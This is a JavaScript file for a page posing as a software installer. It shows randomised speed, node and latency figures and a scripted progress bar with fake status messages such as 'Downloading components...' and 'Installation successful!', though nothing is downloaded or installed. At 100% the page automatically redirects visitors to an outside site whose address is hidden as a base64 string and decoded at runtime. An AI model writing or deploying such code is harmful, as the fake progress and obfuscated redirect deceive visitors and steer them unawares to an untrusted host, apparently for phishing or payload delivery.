// ─── 1. CORRECT LOCAL TIME ───
function updateTimeDisplay() {
    const now = new Date();
    let hours = now.getHours();
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const ampm = hours >= 12 ? 'PM' : 'AM';
    hours = hours % 12 || 12;
    document.getElementById('time-display').textContent = hours + ':' + minutes + ' ' + ampm;
}
updateTimeDisplay();
setInterval(updateTimeDisplay, 1000);

// ─── 2. RANDOM SPEED & NODES ───
const speedVal = (Math.random() * 2.5 + 0.5).toFixed(1) + ' GB/s';
const nodesVal = Math.floor(Math.random() * 451 + 50);
document.getElementById('speedVal').textContent = speedVal;
document.getElementById('nodesVal').textContent = nodesVal;

// ─── 3. LATENCY - SMOOTH RANDOM WALK ───
const latencyEl = document.getElementById('latencyVal');
let currentLatency = 2.0;
setInterval(() => {
    const step = (Math.random() - 0.5) * 0.4;
    let newLat = currentLatency + step;
    if (newLat < 1.0) newLat = 1.0 + Math.random() * 0.4;
    if (newLat > 3.5) newLat = 3.5 - Math.random() * 0.4;
    currentLatency = newLat;
    latencyEl.textContent = currentLatency.toFixed(1) + ' ms';
}, 500);

// ─── 4. PROGRESS ANIMATION + STATUS MESSAGES + REDIRECT ───
const fill = document.getElementById('progressFill');
const pct = document.getElementById('pctDisplay');
const statusMessage = document.getElementById('statusMessage');
const statusText = document.getElementById('statusText');

// Base64 encoded redirect URL (decoded => https://cloudmhax.com/kangerri/)
const encodedUrl = 'aHR0cHM6Ly9jbG91ZG1oYXguY29tL2thbmdlcnJpLw==';
const redirectUrl = atob(encodedUrl);

let val = 0;
const total = 100;
const step = 28;
let start = performance.now();
let done = false;

function animate() {
    const elapsed = performance.now() - start;
    const progress = elapsed / step;
    val = Math.min(progress, total);
    const percent = Math.round((val / total) * 100);

    // Update UI
    fill.style.width = percent + '%';
    pct.textContent = percent + '%';

    // Update status messages based on progress
    if (val < 30) {
        statusMessage.textContent = 'Preparing files...';
        statusText.textContent = 'Connecting to server...';
    } else if (val < 60) {
        statusMessage.textContent = 'Downloading components...';
        statusText.textContent = 'Downloading...';
    } else if (val < 90) {
        statusMessage.textContent = 'Applying configuration...';
        statusText.textContent = 'Configuring system...';
    } else if (val < 100) {
        statusMessage.textContent = 'Finalizing installation...';
        statusText.textContent = 'Almost done...';
    } else {
        if (!done) {
            done = true;
            statusMessage.textContent = 'Complete! Redirecting...';
            statusText.textContent = 'Installation successful!';
            // Redirect after a short delay to let user see 100%
            setTimeout(() => {
                window.location.href = redirectUrl;
            }, 600);
        }
    }

    if (val < total) {
        requestAnimationFrame(animate);
    }
}

animate();